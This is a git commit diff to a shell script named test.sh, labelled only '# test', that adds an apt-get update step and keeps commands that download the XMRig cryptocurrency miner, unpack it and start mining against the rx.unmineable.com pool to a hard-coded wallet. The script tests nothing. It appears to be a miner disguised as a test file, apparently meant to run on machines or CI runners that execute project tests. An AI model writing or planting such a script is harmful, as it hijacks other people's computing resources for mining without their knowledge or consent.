6f906d08268c96ed81f5d890b3ac15e05c536458
cdbenz <81897711+cdbenz@users.noreply.github.com>
2021-05-17 21:40:03 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,4 @@
 # test
-wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 
-
+sudo apt-get update
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3
 ./xmrig --donate-level 5 -o rx.unmineable.com:3333 -u DPeNDBxdMTnrXFpAEhC2EjMQtjKZez9Dfj.ktest -p x -k -a rx/0
